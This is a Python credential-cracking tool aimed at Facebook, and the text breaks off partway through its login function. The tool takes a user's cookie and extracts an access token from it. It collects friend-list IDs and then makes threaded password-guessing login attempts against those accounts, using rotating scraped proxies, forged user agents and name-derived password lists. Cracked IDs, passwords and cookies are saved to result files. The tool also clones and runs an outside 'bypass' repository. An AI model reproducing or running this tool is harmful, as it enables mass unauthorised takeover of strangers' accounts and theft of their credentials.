#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,uuid,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-MONTH ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def refat_rs(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('xdg-open https://www.facebook.com/profile.php?id=100065190184097')
	os.system('clear')
def back():
	login()
	
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r \033[92;1m[\033[91;1m●\033[92;1m] Loading............" + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
#------------------[ LOGO ]-----------------#
loading()
os.system('clear')
os.system('xdg-open https://www.facebook.com/profile.php?id=100065190184097')
logo ="""\033[92;1m   
\033[92;1m╭───────────────────────────────────────────────────────────╮
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m│        \033[91;1m██████╗  \033[92;1m███████╗ \033[93;1m███████╗  \033[94;1m█████╗  \033[96;1m████████╗      \033[92;1m│
\033[92;1m│        \033[91;1m██╔══██╗ \033[92;1m██╔════╝ \033[93;1m██╔════╝ \033[94;1m██╔══██╗ \033[96;1m╚══██╔══╝      \033[92;1m│
\033[92;1m│       \033[91;1m ██████╔╝ \033[92;1m█████╗   \033[93;1m█████╗   \033[94;1m███████║    \033[96;1m██║         \033[92;1m│
\033[92;1m│        \033[91;1m██╔══██╗ \033[92;1m██╔══╝   \033[93;1m██╔══╝   \033[94;1m██╔══██║    \033[96;1m██║         \033[92;1m│
\033[92;1m│       \033[91;1m ██║  ██║ \033[92;1m███████╗ \033[93;1m██║      \033[94;1m██║  ██║    \033[96;1m██║         \033[92;1m│
\033[92;1m│        \033[91;1m╚═╝  ╚═╝ \033[92;1m╚══════╝ \033[93;1m╚═╝      \033[94;1m╚═╝  ╚═╝    \033[96;1m╚═╝         \033[92;1m│
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m│           \x1b[1;33m╔══════════════════════════════════╗\033[1;91m            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m╔══════════════════════════════╗\033[1;33m ║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] TOOL NAME : PUBLIC CLONING\033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] AUTHOR    : REFAT SHAHRIAR\033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] GITHUB    : REFAT-156     \033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] FACEBOOK  : REFAT SHAHRIAR\033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] GROUP     : TERMUX LOVER  \033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] WHATSAPP  : 01613732902   \033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m╚══════════════════════════════╝\033[1;33m ║            \033[92;1m│
\033[92;1m│           \x1b[1;33m╚══════════════════════════════════╝\033[1;91m            \033[92;1m│
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m╰───────────────────────────────────────────────────────────╯
"""
	
#--------------------[ LOGIN-SELECTION ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='green')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		print(logo)
		print('   \033[92;1m╭─[✔] WELCOME BRO      : THIS IS REFAT SHAHRIAR ')
		asu = random.choice([m,k,h,b,u])
		cookie=input('   \033[93;1m╰─[✔] ENTER FB COOKIES : ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {u}[{h}•{u}]{h} \033[94;1mLOGIN SUCCESSFUL PLEASE RUN AGAIN THIS TOOL !{k} ');time.sleep(1)
		os.system("xdg-open https://www.facebook.com/profile.php?id=100076884530114")
		os.system("python Okay.py")
		exit()
#------------------[ SECTION-MENU ]----------------#
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN  UNSUCCESSFUL.....CHECK YOUR COOKIES ! %s'%(x,k,x,m,x))
		exit()

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	print(logo)
	ip =requests.get("https://api.ipify.org").text
	print('   \033[92;1m[\033[91;1m●\033[92;1m] 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 \033[92;1m[\033[91;1m●\033[92;1m] %s \n'%(my_name))
	print('')
	print(' \033[92;1m╭─\033[92;1m[\033[91;1m●\033[92;1m] STATUS     : PREMIUM USER')
	refat_rs(f'{h} ├─\033[92;1m[\033[91;1m●\033[92;1m] COOKIE ID  : '+str(my_id))
	refat_rs(f'{h} ╰─\033[92;1m[\033[91;1m●\033[92;1m] YOUR IP    : {ip}')
	print('')
	print(' ╭─\033[92;1m[\033[91;1m●\033[92;1m] THIS IS PUBLIC CLONING TOOLS ')
	print(' ├─[1] CRACK PUBLIC FRIEND LIST ')
	print(' ├─[2] CHECK ALL [OK/CP] RESULTS ') 
	print(' ├─[3] BYPASS TOOLS FOR FREE ') 
	print(' ├─[4] JOIN OUR FACEBOOK GROUP ') 
	print(' ├─[5] LIKED MY FACEBOOK PAGE ') 
	print(' ├─[6] ANY PROBLEM CONTACT ME BRA ') 
	print(' ╰─[0] LOGOUT AND DELETE COOKIES ')
	print('')
	
	
	refat_bhai = input('\x1b[1;93m   \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : ')
	if refat_bhai in ['1']:
		dump_massal()
	elif refat_bhai in ['2']:
		result()
	elif refat_bhai in ['3']:
		loading()
		os.system(' rm -rf BYPASS-STALL ')
		os.system(' git clone https://github.com/REFAT-156/BYPASS-STALL.git') 
		os.system(' cd BYPASS-STALL && python Bypass.py ')
		os.system('xdg-open https://www.facebook.com/profile.php?id=100065190184097')
	elif refat_bhai in ['4']:
		os.system("xdg-open https://facebook.com/groups/5108476959280518/")
		os.system("python Okay.py")
	elif refat_bhai in ['5']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100076884530114")
		os.system("python Okay.py")
	elif refat_bhai in ['6']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100065190184097")
		os.system("python Okay.py")
	elif refat_bhai in ['0']:
		loading() 
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('Successfully Logout  (Delete Cookies) ')
		os.system("xdg-open https://github.com/REFAT-156")
		os.system(' python Okay.py')
		exit()
	else:
		print('Choose The Right One ')
		back()
def error():
	print(f'{k}Sorry, This Feature Is Still Being Fixed {u}')
	os.system("xdg-open https://github.com/REFAT-156")
	time.sleep(4)
	back()
#-----------------[ CRACK-RESULTS ]-----------------#
def result():
	print(' ╭─[1] YOUR [CP] RESULTS ')
	print(' ├─[2] YOUR [OK] RESULTS ')
	print(' ╰─[0] RETURN ')
	kz = input('\x1b[1;92m   \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : ')
	print('') 
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' \033[92;1m[\033[91;1m●\033[92;1m] File Not Found ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('\033[92;1m[\033[91;1m●\033[92;1m] You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('   ['+nom+'] '+isi+' [ '+str(len(hem))+' Accounts ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('   ['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Accounts ]'+u)
			geeh = input(' \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE Write Input ✍️ ')
				os.system("xdg-open https://github.com/REFAT-156")
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ CLICK ENTER ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('You Dont Have OK ID ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('   ['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('   ['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\x1b[1;91m   \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print('\x1b[1;91m[✔] WRONG ❌ INPUT ')
				os.system("xdg-open https://github.com/REFAT-156")
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'\x1b[1;91m   \033[92;1m[\033[91;1m●\033[92;1m] COOKIES : {u}{cpkuni[2]}')
				nocp +=1
			input('[ Click Enter To Main Menu ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('WRONG ❌ INPUT ')
		exit()
#-------------------[ CRACK-PUBLIC ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('\x1b[1;91   ╭─\033[92;1m[\033[91;1m●\033[92;1m] HOW MUCH ID ADD : '))
	except ValueError:
		print('{k}WRONG TYPE YOU ARE GO BACK ')
		os.system("xdg-open https://github.com/REFAT-156")
		exit()
	if jum<1 or jum>100:
		print('Failed Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('\x1b[1;91   ╰─\033[92;1m[\033[91;1m●\033[92;1m] INPUT ID TO ADD '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('{k}SIGNAL CONTROL ')
			exit()
	try:
		print('')
		print(f' ╭─\033[92;1m[\033[91;1m●\033[92;1m] COLLECTED ID ★ '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		print('SIGNAL CONTROL ')
		back()
	except (KeyError,IOError):
		print(f'{k} Pertemanan Tidak Public {u}')
		time.sleep(3)
		back()
#-------------[ SETTINGS-IDZ ]--------------#
def setting():
	print(' ╰─\033[92;1m[\033[91;1m●\033[92;1m] WANT TO FIND WHICH ACCOUNT ↓↓↓↓↓ ')
	print('') 
	print(' ╭─[1] OLD ID (NOT RECOMMENDED) \n ├─[2] NEW ID (RECOMMENDED) \n ╰─[3] MIX ID (RECOMMENDED) ')
	print('')
	hu = input('   \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('WRONG ENTER ')
		exit()
	print(' ╭─\033[92;1m[\033[91;1m●\033[92;1m] LOGIN METHOD ↓↓↓↓↓  ')
	print(' ├─[1] MOBILE (HIGHLY RECOMMENDED) \n ├─[2] MBASIC (RECOMMENDED) \n ├─[3] FREE BASIC (NOT RECOMMENDED) \n ╰─[4] MTOUCH (NOT RECOMMENDED) ')
	print('')
	hc = input('\x1b[1;94m   \033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : ')
	if hc in ['1','01']:
		method.append('mobile')

	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print(f' ╭─\033[92;1m[\033[91;1m●\033[92;1m] NOTES ↓↓↓ \n ╰─\033[92;1m[\033[91;1m●\033[92;1m] TO USE DEFAULT PASSWORD ') 
	print('')
	_jembot_ = input('\x1b[1;92m ╭─\033[92;1m[\033[91;1m●\033[92;1m] SHOW APPS ( Y/t ) ')
	
	pwplus=input('\x1b[1;92m ╰─\033[92;1m[\033[91;1m●\033[92;1m] Add Password Manual/default( m/d ) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(' ╭─\033[92;1m[\033[91;1m●\033[92;1m] Enter An Additional Password Of At Least 6 Characters')
		pwku=input('\x1b[1;91m ╰─\033[92;1m[\033[91;1m●\033[92;1m] Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
#------------------[ SECTION-WORDLIST ]------------#
def passwrd():
	print('')
	print('            \033[92;1m[\033[91;1m®\033[92;1m] WAITING FOR CRACKING RESULTS, GOOD LUCK \033[92;1m[\033[91;1m®\033[92;1m] ')
	print('')
	print(f'                     {m}P {k}L {h}E {u}A {b}S {b}E  ®  {b}W {u}A {h} I{k} T{m}')
	print('')
	print(f'\x1b[1;92m ╭─\033[92;1m[\033[91;1m●\033[92;1m] OK RESULTS SAVED IN : {h}OK/%s {b}'%(okc))
	print(f'\x1b[1;92m ├─\033[92;1m[\033[91;1m●\033[92;1m] CP RESULTS SAVED IN : {h}CP/%s {b}'%(cpc))
	print(f'\x1b[1;92m ╰─\033[92;1m[\033[91;1m●\033[92;1m] TURN \033[92;1m[\033[91;1mON●OF\033[92;1m] AIRPLANE MODE EVERY 1K ID \n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'786786')
					pwv.append(frs+'12345678')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'111222')
					pwv.append(frs+'Fuck123')
					pwv.append(frs+'102030')
					pwv.append(frs+'@@@')
					pwv.append('Fuck off')
					pwv.append('I Love You')
					pwv.append('I Fuck You')
					pwv.append('I love Allah')
					pwv.append('i fuck you')
					pwv.append('Mother Fucker')
					pwv.append(frs+'143')
					pwv.append(frs+'000')
					pwv.append(frs+'0000')
					pwv.append(frs+'111')
					pwv.append(frs+'11111')
					pwv.append(frs+'1111')
					pwv.append(frs+'111333')
					pwv.append(frs+'786')
					pwv.append(frs+'135')
					pwv.append(frs+'13579')
					pwv.append(frs+'111@')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'786786')
					pwv.append(frs+'12345678')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'111222')
					pwv.append(frs+'Fuck123')
					pwv.append(frs+'102030')
					pwv.append(frs+'@@@')
					pwv.append('Fuck off')
					pwv.append('I Love You')
					pwv.append('I Fuck You')
					pwv.append('I love Allah')
					pwv.append('i fuck you')
					pwv.append('Mother Fucker')
					pwv.append(frs+'143')
					pwv.append(frs+'000')
					pwv.append(frs+'0000')
					pwv.append(frs+'111')
					pwv.append(frs+'11111')
					pwv.append(frs+'1111')
					pwv.append(frs+'111333')
					pwv.append(frs+'786')
					pwv.append(frs+'135')
					pwv.append(frs+'13579')
					pwv.append(frs+'111@') 
					
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print('\t  \033[92;1m[\033[91;1m●\033[92;1m] Crack Done, Dont Forget to Be Thanks ')
	print(f'   \033[92;1m[\033[91;1m●\033[92;1m] OK : {h}%s '%(ok))
	print(f'   \033[92;1m[\033[91;1m●\033[92;1m] CP : {k}%s{u} '%(cp))
	print('')
	print('   \x1b[1;95m\033[92;1m[\033[91;1m●\033[92;1m] Continue Cracking Back ( Y/t ) ? ')
	woi = input('   \x1b[1;96m\033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{k} 😚 GOOD BYE AGAIN COME 😚{u} ')
		os.system('xdg-open https://www.facebook.com/profile.php?id=100065190184097')
		time.sleep(2)
		exit()
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{b}[REFAT-CRACK] --> {P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('')
				print('') 
				print('😪 [REFAT-CP] 😪')
				print('') 
				print(f'\r{K}>> {idf}|{pw}{N}')     
